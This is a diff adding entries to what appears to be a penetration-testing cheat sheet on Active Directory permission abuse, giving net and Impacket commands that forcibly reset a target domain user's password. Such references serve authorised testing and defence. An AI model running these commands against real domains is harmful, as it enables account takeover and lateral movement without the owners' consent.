@@ -2,9 +2,21 @@
 
 ### ForceChangePassword
 
+#### 1) Net (Windows)
+
     net user USER PASSWORD /domain (Windows)
 
+#### 2) Net (Linux)
+
     net rpc password USER PASSWORD -S DC_FQDN (Linux)
+
+#### 3) Impacket
+
+    impacket-changepasswd ignite.local/USER1@DC_IP -newpass Password@1234 -altuser ignite.local/TARGET_USER -altpass Password@1 -reset
+
+Impacket’s changepassword can also be used to change current user password, if current password is known.
+
+    impacket-changepasswd domain.local/USER1@DC_IP -newpass ‘Password@987’ -p rpc-samr
 
 ### GenericAll / GenericWrite
 
